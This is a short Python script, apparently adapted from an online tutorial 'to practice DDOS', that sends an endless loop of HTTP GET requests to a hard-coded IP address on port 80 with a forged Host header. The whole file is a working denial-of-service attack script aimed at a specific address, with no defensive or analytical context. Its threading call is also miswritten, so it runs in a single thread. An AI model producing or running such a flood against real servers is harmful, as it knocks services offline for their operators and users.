###############################################################################
#
# To practice DDOS: https://www.neuralnine.com/code-a-ddos-script-in-python/
#
###############################################################################
import socket
import threading


def attack(target, host, port, attack_num):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + host + " \r\n\r\n").encode('ascii'), (target, port))

        attack_num
        attack_num += 1
        print(attack_num)

        s.close()


def main():
    target = '173.236.156.34'
    host = '182.21.20.32'
    port = 80
    attack_num = 0
    val = 1

    for i in range(val):
        thread = threading.Thread(target=attack(target, host, port, attack_num))
        thread.start()


if __name__ == "__main__":
    main()
